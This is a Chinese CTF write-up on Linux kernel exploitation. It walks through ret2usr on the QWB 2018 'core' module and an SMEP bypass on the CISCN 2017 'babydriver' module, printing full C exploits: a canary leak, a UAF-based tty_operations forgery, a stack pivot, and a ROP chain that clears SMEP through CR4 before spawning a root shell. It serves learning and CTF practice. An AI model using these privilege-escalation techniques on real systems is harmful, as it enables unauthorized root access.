@@ -1,0 +1,462 @@
+## 一、前言
+
+在我们的pwn学习过程中，能够很明显的感觉到开发人员们为了阻止某些利用手段而增加的保护机制，往往这些保护机制又会引发出新的bypass技巧，像是我们非常熟悉的Shellcode与NX，NX与ROP。而当我们将视角从用户态放到内核态的时候，便是笔者今天想与大家分享的两个利用手段：ret2usr与bypass_smep。
+
+## 二、ret2usr利用介绍
+
+ret2usr的资料在网上其实并不算多，究其原因是其利用手法相对简单，其本意是利用了内核空间可以访问用户空间这个特性来定向内核代码或数据流指向用户空间，并以ring0的特权级在用户空间完成提权操作。
+
+## 三、ret2usr例题讲解
+
+这次以Kernel ROP那一篇中介绍过的例题"2018年强网杯
+core"来对ret2usr利用手段进行讲解，具体的题目分析在之前的篇章中已经做过具体分析，这边只是简单概述一下模块内容。
+
+    
+    
+    在core_ioctl函数中定义的三种功能  
+    0x6677889B：执行core_read函数,存在内存信息泄露，可用来leak canary  
+    0x6677889C：对全局变量off赋值,可用来控制core_read函数中的内存偏移，从而造成泄露问题  
+    0x6677889A：执行core_copy_func函数，配合core_write函数以及对复制的内容长度不严谨从而造成栈溢出隐患
+
+在前一篇Kernel ROP中我们的利用思路具体如下所示。
+
+    
+    
+    1、保存返回用户态所需的寄存器信息  
+    2、利用core_read leak canary  
+    3、通过/tmp/kallsyms中的信息获取函数地址与计算ropgadget的偏移  
+    4、利用core_copy_func函数存在的栈溢出控制内核程序流完成提权并返回用户态执行shell
+
+而本篇的ret2usr中我们的利用思路则发生了些许的改变，原先第四步中我们通过劫持内核程序流并构造ropchain来完成的提权步骤，现在我们修改提权方式，控制内核程序流访问user
+space中的函数指针来完成提权操作，在我们的exp中构建如下的函数。
+
+    
+    
+    void beroot() {  
+    char* (*func1) (int) = prepare_kernel_cred;  
+    void (*func2) (char*) = commit_creds;  
+    (*func2)((*func1)(0));  
+    }
+
+可以看到我们通过函数指针的方式在用户空间执行了commit_creds(prepare_kernel_cred(0))，能过做到这样的本质原因是因为我们在劫持程序流程的时候处在ring0权限，并且因为SMEP保护未开启的原因我们可以从内核空间访问用户空间的代码，所以才能完成提权的操作。​
+当我们控制内核程序流在用户空间完成提权工作以后，就可以返回用户态并获取rootShell了，完整EXP如下所示。
+
+    
+    
+    #include <string.h>  
+    #include <stdio.h>  
+    #include <stdlib.h>  
+    #include <unistd.h>  
+    #include <fcntl.h>  
+    #include <sys/stat.h>  
+    #include <sys/types.h>  
+    #include <sys/ioctl.h>  
+    ​  
+    #define CORE_READ 0x6677889B  
+    #define SET_OFFSET 0x6677889C  
+    #define CORE_COPY_FUNC 0x6677889A  
+    ​  
+    unsigned long long int canary[64] = {0};  
+    unsigned long long int raw_vmlinux_base = 0xffffffff81000000;  
+    unsigned long long int commit_creds, prepare_kernel_cred, vmlinux_base;  
+    unsigned long long int user_cs, user_ss, user_rflags, user_sp;  
+    ​  
+    void save_status()  
+    {  
+    __asm__("mov user_cs, cs;"  
+    "mov user_ss, ss;"  
+    "mov user_sp, rsp;"  
+    "pushf;"  
+    "pop user_rflags;"  
+    );  
+    puts("[*]status has been saved.");  
+    }  
+    ​  
+    void beroot() {  
+    char* (*func1) (int) = prepare_kernel_cred;  
+    void (*func2) (char*) = commit_creds;  
+    (*func2)((*func1)(0));  
+    }  
+    ​  
+    //ffffffffb8c9c8e0 T commit_creds  
+    int leak_addr() {  
+    int idx;  
+    char buf[1024];  
+    int fd = open("/tmp/kallsyms", 0);  
+    if (fd < 0) {  
+    puts("[-] ERROR.");  
+    exit(0);  
+    }  
+    ​  
+    puts("[+] Leak Address...");  
+    ​  
+    while (1) {  
+    int i;  
+    for (i = 0; i < sizeof(buf); i++) {  
+    read(fd, buf + i, 1);  
+    if(buf[i] == '\n') {  
+    if (strstr(buf, "commit_creds")) {  
+    sscanf(buf, "%llx", &commit_creds);  
+    printf("[+] Find commit_creds_address: 0x%llx\n", commit_creds);  
+    vmlinux_base = commit_creds - 0x9c8e0;  
+    prepare_kernel_cred = vmlinux_base + 0x9cce0;  
+    return 1;  
+    }  
+    else {  
+    i = 0;  
+    }  
+    }  
+    }  
+    }  
+    ​  
+    return 0;  
+    ​  
+    }  
+    ​  
+    void leak_canary(int fd) {  
+    ​  
+    puts("[+] Leak Canary...");  
+    ioctl(fd, SET_OFFSET, 0x40);  
+    ioctl(fd, CORE_READ, canary); //core_read+105  
+    printf("[+] Canary: 0x%llx \n", canary[0]);  
+    }  
+    ​  
+    void get_shell() {  
+    if (getuid() == 0) {  
+    puts("[+] root shell.");  
+    system("/bin/sh");  
+    }  
+    }  
+    ​  
+    void main() {  
+    ​  
+    unsigned long long int pop_rdi, pop_rsi, pop_rdx, pop_rcx, mov_rdi_rax, swapgs, iretq, xchg_rax_rdx, offset;  
+    unsigned long long int rop[0x60];  
+    int i = 8;  
+    ​  
+    int fd = open("/proc/core", 'r');  
+    if (fd <= 0) {  
+    puts("[-] open filename 'core' ERROR.");  
+    exit(0);  
+    }  
+    ​  
+    save_status();  
+    leak_addr();  
+    leak_canary(fd);  
+    ​  
+    offset = vmlinux_base - raw_vmlinux_base;  
+    pop_rdi = offset + 0xffffffff81000b2f;  
+    pop_rsi = offset + 0xffffffff810011d6;  
+    pop_rdx = offset + 0xffffffff810a0f49;  
+    pop_rcx = offset + 0xffffffff81021e53;  
+    swapgs = offset + 0xffffffff81a012da;  
+    iretq = offset + 0xffffffff81050ac2;  
+    xchg_rax_rdx = offset + 0xffffffff826684f0; // xchg rax, rdx; ret;  
+    mov_rdi_rax = offset + 0xffffffff8106a6d2;  
+    printf("0x%llx\n", offset);  
+    ​  
+    rop[i++] = canary[0];  
+    rop[i++] = 0;  
+    rop[i++] = (unsigned long long int)beroot;  
+    rop[i++] = swapgs;  
+    rop[i++] = 0;  
+    rop[i++] = iretq;  
+    rop[i++] = (unsigned long long int)get_shell;  
+    rop[i++] = user_cs;  
+    rop[i++] = user_rflags;  
+    rop[i++] = user_sp;  
+    rop[i++] = user_ss;  
+    ​  
+    write(fd, rop, sizeof(rop));  
+    ioctl(fd, CORE_COPY_FUNC, 0xffffffffffff0000|0x100);  
+    ​  
+    }
+
+![1.png](https://image.3001.net/images/20220317/1647478532_62328704c7d0e0dab0efc.png!small)
+
+## 四、bypass_smep原理介绍
+
+ret2usr利用最根本的原因是因为内核态可以任意访问用户态的数据，从而造成了被利用的风险。而SMEP对于ret2usr正如NX与Shellcode一样有效的降低了被利用的风险。​
+SMEP(Supervisormode execution
+protection，SMEP)机制的作用是，当进程在内核模式下运行时，该防御机制会将页表中的所有用户空间的内存页标记为不可执行的。在内核中，这个功能可以通过设置控制寄存器CR4的第20位来启用。在启动时，可以通过在-cpu选项下加入+smep来启用该防御机制，通过在-append选项下加入nosmep来禁用该机制。​
+由于SMEP保护使得内核空间无法访问用户空间的内容，从而使得ret2usr的利用变得不可行。但是正如我们开头所说的那样，保护机制的诞生会演化出新的bypass技巧。系统根据CR4寄存器中第二十位的值来判断SMEP保护是否开启，1为开启0为关闭。​
+
+![2.png](https://image.3001.net/images/20220317/1647478533_623287057e46ccefa330f.png!small)
+
+而CR4寄存器我们是可以通过gadget来对里面的值进行修改的，为了关闭SMEP常用的固定值0x6f0，即mov CR4, 0x6f0。
+
+## 五、bypass_smep例题讲解
+
+同样是前面文章所提到过的2017-CISCN-babydriver，在前面的学习中我们利用Kernel
+UAF的方式完成了提权操作，而本次我们所要学习的就是劫持程序流关闭SMEP保护以后，利用前面所学习的ret2usr完成提权操作并获取rootshell。​
+
+在分析利用思路之前，我们需要引入一个新的结构体tty_struct。这是一个在打开/dev/ptmx设备时会分配的结构体，源码如下所示。
+
+    
+    
+    struct tty_struct {  
+    int magic;  
+    struct kref kref;  
+    struct device *dev;  
+    struct tty_driver *driver;  
+    const struct tty_operations *ops;  
+    int index;  
+    /* Protects ldisc changes: Lock tty not pty */  
+    struct ld_semaphore ldisc_sem;  
+    struct tty_ldisc *ldisc;  
+    struct mutex atomic_write_lock;  
+    struct mutex legacy_mutex;  
+    struct mutex throttle_mutex;  
+    struct rw_semaphore termios_rwsem;  
+    struct mutex winsize_mutex;  
+    spinlock_t ctrl_lock;  
+    spinlock_t flow_lock;  
+    /* Termios values are protected by the termios rwsem */  
+    struct ktermios termios, termios_locked;  
+    struct termiox *termiox;    /* May be NULL for unsupported */  
+    char name[64];  
+    struct pid *pgrp;       /* Protected by ctrl lock */  
+    struct pid *session;  
+    unsigned long flags;  
+    int count;  
+    struct winsize winsize;     /* winsize_mutex */  
+    unsigned long stopped:1,    /* flow_lock */  
+    flow_stopped:1,  
+    unused:BITS_PER_LONG - 2;  
+    int hw_stopped;  
+    unsigned long ctrl_status:8,    /* ctrl_lock */  
+    packet:1,  
+    unused_ctrl:BITS_PER_LONG - 9;  
+    unsigned int receive_room;  /* Bytes free for queue */  
+    int flow_change;  
+    struct tty_struct *link;  
+    struct fasync_struct *fasync;  
+    wait_queue_head_t write_wait;  
+    wait_queue_head_t read_wait;  
+    struct work_struct hangup_work;  
+    void *disc_data;  
+    void *driver_data;  
+    spinlock_t files_lock;      /* protects tty_files list */  
+    struct list_head tty_files;  
+    #define N_TTY_BUF_SIZE 4096  
+    int closing;  
+    unsigned char *write_buf;  
+    int write_cnt;  
+    /* If the tty has a pending do_SAK, queue it here - akpm */  
+    struct work_struct SAK_work;  
+    struct tty_port *port;  
+    } __randomize_layout;
+
+而其中有一个非常有用的结构体tty_operations，其源码如下所示，不难看出其中含有大量的函数指针供我们使用。所以我们可以使用一种类似于FSOP中伪造vtable表的方式来伪造这个结构体使其可以控制内核程序流。
+
+    
+    
+    struct tty_operations {  
+    struct tty_struct * (*lookup)(struct tty_driver *driver,  
+    struct file *filp, int idx);  
+    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);  
+    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);  
+    int  (*open)(struct tty_struct * tty, struct file * filp);  
+    void (*close)(struct tty_struct * tty, struct file * filp);  
+    void (*shutdown)(struct tty_struct *tty);  
+    void (*cleanup)(struct tty_struct *tty);  
+    int  (*write)(struct tty_struct * tty,  
+    const unsigned char *buf, int count);  
+    int  (*put_char)(struct tty_struct *tty, unsigned char ch);  
+    void (*flush_chars)(struct tty_struct *tty);  
+    int  (*write_room)(struct tty_struct *tty);  
+    int  (*chars_in_buffer)(struct tty_struct *tty);  
+    int  (*ioctl)(struct tty_struct *tty,  
+    unsigned int cmd, unsigned long arg);  
+    long (*compat_ioctl)(struct tty_struct *tty,  
+    unsigned int cmd, unsigned long arg);  
+    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);  
+    void (*throttle)(struct tty_struct * tty);  
+    void (*unthrottle)(struct tty_struct * tty);  
+    void (*stop)(struct tty_struct *tty);  
+    void (*start)(struct tty_struct *tty);  
+    void (*hangup)(struct tty_struct *tty);  
+    int (*break_ctl)(struct tty_struct *tty, int state);  
+    void (*flush_buffer)(struct tty_struct *tty);  
+    void (*set_ldisc)(struct tty_struct *tty);  
+    void (*wait_until_sent)(struct tty_struct *tty, int timeout);  
+    void (*send_xchar)(struct tty_struct *tty, char ch);  
+    int (*tiocmget)(struct tty_struct *tty);  
+    int (*tiocmset)(struct tty_struct *tty,  
+    unsigned int set, unsigned int clear);  
+    int (*resize)(struct tty_struct *tty, struct winsize *ws);  
+    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);  
+    int (*get_icount)(struct tty_struct *tty,  
+    struct serial_icounter_struct *icount);  
+    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);  
+    #ifdef CONFIG_CONSOLE_POLL  
+    int (*poll_init)(struct tty_driver *driver, int line, char *options);  
+    int (*poll_get_char)(struct tty_driver *driver, int line);  
+    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);  
+    #endif  
+    int (*proc_show)(struct seq_file *, void *);  
+    } __randomize_layout;
+
+那么具体应该怎么利用呢？首先我们需要注意到的就是在本题环境中tty_struct结构体占0x260字节大小，所以我们可以利用题目中存在的UAF漏洞泄露出结构体的部分内容并修改其中的tty_operations指向我们伪造的结构体fake_tty_ops并在其中布置好相应的ropchain即可完成最终的利用。​
+但是这样的话又会产生一个问题，我们伪造的tty_operations结构体中应该怎么布局才可以呢？我们不妨写一个简单的测试代码通过动调的方式来理解，具体的代码如下所示。
+
+    
+    
+    #include <string.h>  
+    #include <stdio.h>  
+    #include <stdlib.h>  
+    #include <unistd.h>  
+    #include <fcntl.h>  
+    #include <sys/stat.h>  
+    #include <sys/types.h>  
+    #include <sys/ioctl.h>  
+    ​  
+    void main() {  
+    ​  
+    int fd1 = open("/dev/babydev", O_RDWR);  
+    int fd2 = open("/dev/babydev", O_RDWR);  
+    ​  
+    // UAF  
+    ioctl(fd1, 0x10001, 0x2e0);  
+    close(fd1);  
+    ​  
+    // fake struct  
+    size_t fake_tty_struct[32];  
+    size_t fake_tty_ops[32];  
+    ​  
+    fake_tty_ops[0] = 0xffffffffc0000130;  
+    fake_tty_ops[1] = 0xffffffffc0000130;  
+    fake_tty_ops[2] = 0xffffffffc0000130;  
+    // fake_tty_ops[7] = mov_rsp_rax;  
+    fake_tty_ops[7] = 0xffffffffc0000130;  
+    ​  
+    // close smep --> ret2usr --> get root's shell  
+    int fd_tty = open("/dev/ptmx", O_RDWR);  
+    read(fd2, fake_tty_struct, 32);  
+    fake_tty_struct[3] = (size_t)fake_tty_ops;  
+    write(fd2, fake_tty_struct, 32);  
+    ​  
+    write(fd_tty, "AMALLL", 6);  
+    }
+
+然后我们将写好的demo静态编译完成后，使用gdb脚本调试，创建gdbint文件并写入如下内容，最后在qemu启动脚本中添加-s选项并另开shell窗口执行gdb -x gdbinit即可动调。
+
+    
+    
+    file vmlinux  
+    add-symbol-file babydriver.ko 0xffffffffc0000000  
+    b babyread  
+    target remote :1234  
+    continue
+
+上面的demo中我们伪造了tty_operations结构体中write函数指针为babyread函数地址，并且通过动调我们可以发现rax寄存器正是我们所伪造的fake_tty_operations结构体的地址，那么如果我们将tty_operations结构体中write函数指针位置放置诸如
+mov rsp ,rax;
+一类的gadget，则可以劫持栈指针到我们的fake_tty_operations地址处，我们再在伪造的结构体开头布置上二次栈迁移的gadget控制rsp指向我们布置的ropchain上，那么就可以执行关闭SMEP的rop，然后我们就可以利用前面介绍的ret2usr
+rop进行提权利用啦。
+
+![3.png](https://image.3001.net/images/20220317/1647478534_62328706440f9b1f54d9f.png!small)
+
+### EXP.C
+
+    
+    
+    #include <string.h>  
+    #include <stdio.h>  
+    #include <stdlib.h>  
+    #include <unistd.h>  
+    #include <fcntl.h>  
+    #include <sys/stat.h>  
+    #include <sys/types.h>  
+    #include <sys/ioctl.h>  
+    ​  
+    size_t user_cs, user_ss, user_rflags, user_sp;  
+    size_t commit_creds = 0xffffffff810a1420;  
+    size_t prepare_kernel_cred = 0xffffffff810a1810;  
+    size_t pop_rdi = 0xffffffff810d238d;  
+    size_t mov_cr4 = 0xffffffff81004d80; // mov cr4, rdi; pop rbp; ret;  
+    size_t swapgs = 0xffffffff81063694;  // swapgs; pop rbp; ret;  
+    size_t iretq = 0xffffffff814e35ef;  
+    size_t pop_rax = 0xffffffff8100ce6e;  
+    size_t mov_rsp_rax = 0xffffffff8181bfc5; // mov rsp,rax ; dec ebx ; ret  
+    ​  
+    void save_status() {  
+    __asm__("mov user_cs, cs;"  
+    "mov user_ss, ss;"  
+    "mov user_sp, rsp;"  
+    "pushf;"  
+    "pop user_rflags;"  
+    );  
+    puts("[*]status has been saved.");  
+    }  
+    ​  
+    void beroot() {  
+    char* (*func1)(int) = (char* (*)(int))prepare_kernel_cred;  
+    void (*func2)(char*) = (void (*)(char *))commit_creds;  
+    (*func2)((*func1)(0));  
+    }  
+    ​  
+    void getshell() {  
+    if (getuid() == 0) {     
+    puts("[+] root now.");  
+    system("/bin/sh");  
+    }else {  
+    puts("[-] Get shell error.");  
+    exit(0);  
+    }  
+    }  
+    ​  
+    void main() {  
+      
+    save_status();  
+    ​  
+    int fd1 = open("/dev/babydev", O_RDWR);  
+    int fd2 = open("/dev/babydev", O_RDWR);  
+    ​  
+    // UAF  
+    ioctl(fd1, 0x10001, 0x2e0);  
+    close(fd1);  
+    ​  
+    // set ropchain  
+    size_t rop[0x30] = {0};  
+    int i = 0;  
+    ​  
+    rop[i++] = pop_rdi;  
+    rop[i++] = 0x6f0;  
+    rop[i++] = mov_cr4;  
+    rop[i++] = 0;  
+    rop[i++] = (size_t)beroot;  
+    rop[i++] = swapgs;  
+    rop[i++] = 0;  
+    rop[i++] = iretq;  
+    rop[i++] = (size_t)getshell;  
+    rop[i++] = user_cs;  
+    rop[i++] = user_rflags;  
+    rop[i++] = user_sp;  
+    rop[i++] = user_ss;  
+    ​  
+    // fake struct  
+    size_t fake_tty_struct[32];  
+    size_t fake_tty_ops[32];  
+    ​  
+    fake_tty_ops[0] = pop_rax;  
+    fake_tty_ops[1] = (size_t)rop;  
+    fake_tty_ops[2] = mov_rsp_rax;  
+    fake_tty_ops[7] = mov_rsp_rax;  
+    ​  
+    // close smep --> ret2usr --> get root's shell  
+    int fd_tty = open("/dev/ptmx", O_RDWR);  
+    read(fd2, fake_tty_struct, 32);  
+    fake_tty_struct[3] = (size_t)fake_tty_ops;  
+    write(fd2, fake_tty_struct, 32);  
+    ​  
+    write(fd_tty, "AMALLL", 6);  
+    ​  
+    }
+
+![4.png](https://image.3001.net/images/20220317/1647478535_6232870703211081f63e5.png!small)
+
+## 六、总结
+
+笔者分享的两种利用方式都不算困难，但是需要注意的是在编译exploit时请使用Ubuntu 16.04的环境，笔者尝试使用Ubuntu 20 与
+18的环境编译exploit最终执行阶段都无法完成提权操作。同时在做Kernel题目的时候会明显的感觉自己的知识树储备不够，这里笔者推荐《操作系统真象还原》这本书，里面不管是案例还是讲解都非常有趣，相信你一定能从这本书中有所收获。
+
